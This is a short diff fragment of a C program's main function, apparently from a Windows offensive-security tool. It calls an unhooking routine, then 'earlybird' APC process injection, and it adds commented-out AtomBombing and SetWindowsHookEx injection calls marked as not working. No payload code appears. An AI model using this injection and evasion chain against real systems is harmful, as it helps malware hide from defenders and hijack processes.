@@ -55,10 +55,15 @@ int main(int argc, char* argv[])
 	perunfart(pi.hProcess);
 
 
+
+
+
 	// Uncomment for Process injection
 	// - Earlybird for APC routine in a suspended process
 	// - NTInject for simple exectuion with direct NT functions
 	printf("\n****** PROCESS INJECTION *****\n");
+	//AtomBombing(); -- NOT WORKING 
+	//SetWinHookEx(pi); -- NOT WORKING
 	earlybird(pi);
 	//NTinject();
 
